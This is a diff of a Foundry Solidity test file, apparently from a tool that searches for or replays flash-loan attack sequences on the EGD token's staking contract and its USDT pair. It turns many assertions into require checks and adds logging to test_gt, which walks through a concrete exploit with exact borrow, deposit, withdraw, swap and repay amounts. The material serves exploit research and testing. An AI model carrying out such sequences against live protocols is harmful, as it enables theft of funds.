@@ -231,7 +231,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt1, amt2);
         swap_pair_attacker_egd_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -251,7 +251,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt2, amt3);
         swap_pair_attacker_egd_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -271,7 +271,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt3);
         swap_pair_attacker_egd_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -289,7 +289,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt1, amt2);
         swap_pair_attacker_usdt_egd(amt3, amt4);
         payback_egd_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -309,7 +309,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt2, amt3);
         swap_pair_attacker_usdt_egd(amt4, amt5);
         payback_egd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -329,7 +329,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt3);
         swap_pair_attacker_usdt_egd(amt4, amt5);
         payback_egd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -348,7 +348,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt2);
         swap_pair_attacker_egd_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -372,7 +372,7 @@ contract EGDTest is Test, BlockLoader {
         payback_usdt_pair(amt4);
         swap_pair_attacker_egd_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -396,7 +396,7 @@ contract EGDTest is Test, BlockLoader {
         payback_egd_pair(amt4);
         swap_pair_attacker_egd_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -418,7 +418,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt4);
         swap_pair_attacker_egd_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -440,7 +440,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt4);
         swap_pair_attacker_egd_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -461,7 +461,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt3);
         swap_pair_attacker_egd_usdt(amt4, amt5);
         payback_usdt_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -480,7 +480,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt3);
         withdraw_egdstaking_egdslp_egd(amt4);
         payback_egd_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -501,7 +501,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt4);
         withdraw_egdstaking_egdslp_egd(amt5);
         payback_egd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -525,7 +525,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt5);
         payback_usdt_pair(amt6);
         payback_egd_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -549,7 +549,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt5);
         payback_egd_pair(amt6);
         payback_egd_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -571,7 +571,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt4, amt5);
         withdraw_egdstaking_egdslp_egd(amt6);
         payback_egd_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -593,7 +593,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt4, amt5);
         withdraw_egdstaking_egdslp_egd(amt6);
         payback_egd_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -615,7 +615,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt4);
         swap_pair_attacker_usdt_egd(amt5, amt6);
         payback_egd_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -639,7 +639,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt5, amt6);
         swap_pair_attacker_egd_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -665,7 +665,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt6, amt7);
         swap_pair_attacker_egd_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -691,7 +691,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt6, amt7);
         swap_pair_attacker_egd_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -717,7 +717,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt6, amt7);
         swap_pair_attacker_egd_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -743,7 +743,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt7);
         swap_pair_attacker_egd_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -767,7 +767,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt5, amt6);
         swap_pair_attacker_usdt_egd(amt7, amt8);
         payback_egd_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -793,7 +793,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt6, amt7);
         swap_pair_attacker_usdt_egd(amt8, amt9);
         payback_egd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -819,7 +819,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt6, amt7);
         swap_pair_attacker_usdt_egd(amt8, amt9);
         payback_egd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -845,7 +845,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt6, amt7);
         swap_pair_attacker_usdt_egd(amt8, amt9);
         payback_egd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -871,7 +871,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt7);
         swap_pair_attacker_usdt_egd(amt8, amt9);
         payback_egd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -896,7 +896,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt6);
         swap_pair_attacker_egd_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -921,7 +921,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt5, amt6);
         swap_pair_attacker_egd_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -946,7 +946,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt7);
         withdraw_egdstaking_egdslp_egd(amt8);
         payback_egd_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -971,7 +971,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt5, amt6);
         swap_pair_attacker_usdt_egd(amt7, amt8);
         payback_egd_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -997,7 +997,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt6);
         swap_pair_attacker_egd_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1028,7 +1028,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1059,7 +1059,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1088,7 +1088,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1117,7 +1117,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1145,7 +1145,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt7);
         swap_pair_attacker_egd_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1176,7 +1176,7 @@ contract EGDTest is Test, BlockLoader {
         payback_usdt_pair(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1207,7 +1207,7 @@ contract EGDTest is Test, BlockLoader {
         payback_egd_pair(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1236,7 +1236,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1265,7 +1265,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_egd_usdt(amt9, amt10);
         payback_usdt_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1293,7 +1293,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt7);
         swap_pair_attacker_egd_usdt(amt8, amt9);
         payback_usdt_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1319,7 +1319,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt7);
         withdraw_egdstaking_egdslp_egd(amt8);
         payback_egd_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1347,7 +1347,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt8);
         withdraw_egdstaking_egdslp_egd(amt9);
         payback_egd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1378,7 +1378,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt9);
         withdraw_egdstaking_egdslp_egd(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1409,7 +1409,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt9);
         withdraw_egdstaking_egdslp_egd(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1438,7 +1438,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt9);
         withdraw_egdstaking_egdslp_egd(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1467,7 +1467,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt9);
         withdraw_egdstaking_egdslp_egd(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1495,7 +1495,7 @@ contract EGDTest is Test, BlockLoader {
         deposit_egdstaking_usdt_egdslp(amt8);
         withdraw_egdstaking_egdslp_egd(amt9);
         payback_egd_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1526,7 +1526,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt9);
         payback_usdt_pair(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1557,7 +1557,7 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt9);
         payback_egd_pair(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1586,7 +1586,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_egd_usdt(amt8, amt9);
         withdraw_egdstaking_egdslp_egd(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1615,7 +1615,7 @@ contract EGDTest is Test, BlockLoader {
         swap_pair_attacker_usdt_egd(amt8, amt9);
         withdraw_egdstaking_egdslp_egd(amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1644,27 +1644,41 @@ contract EGDTest is Test, BlockLoader {
         withdraw_egdstaking_egdslp_egd(amt8);
         swap_pair_attacker_usdt_egd(amt9, amt10);
         payback_egd_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 2100e18);
         borrow_usdt_owner(2100e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 100e18);
         deposit_egdstaking_usdt_egdslp(100e18);
         printBalance("After step1 ");
+        emit log_named_uint("amt2", 424526221219952604636716);
         borrow_usdt_pair(424526221219952604636716);
         printBalance("After step2 ");
+        emit log_named_uint("amt3", 0);
         withdraw_egdstaking_egdslp_egd(0);
         printBalance("After step3 ");
+        emit log_named_uint(
+            "amt4",
+            (uint(424526221219952604636716) * 1003) / 1000
+        );
         payback_usdt_pair((uint(424526221219952604636716) * 1003) / 1000);
         printBalance("After step4 ");
+        emit log_named_uint("amt5", egd.balanceOf(attacker));
+        emit log_named_uint(
+            "amt6",
+            pair.getAmountOut(egd.balanceOf(attacker), address(egd))
+        );
         swap_pair_attacker_egd_usdt(
             egd.balanceOf(attacker),
             pair.getAmountOut(egd.balanceOf(attacker), address(egd))
         );
         printBalance("After step5 ");
+        emit log_named_uint("amt7", (2100e18 * 1003) / 1000);
         payback_usdt_owner((2100e18 * 1003) / 1000);
         printBalance("After step6 ");
         require(attackGoal(), "Attack failed!");
@@ -1691,7 +1705,7 @@ contract EGDTest is Test, BlockLoader {
         payback_usdt_pair(amt4);
         swap_pair_attacker_egd_usdt(amt5, amt6);
         payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
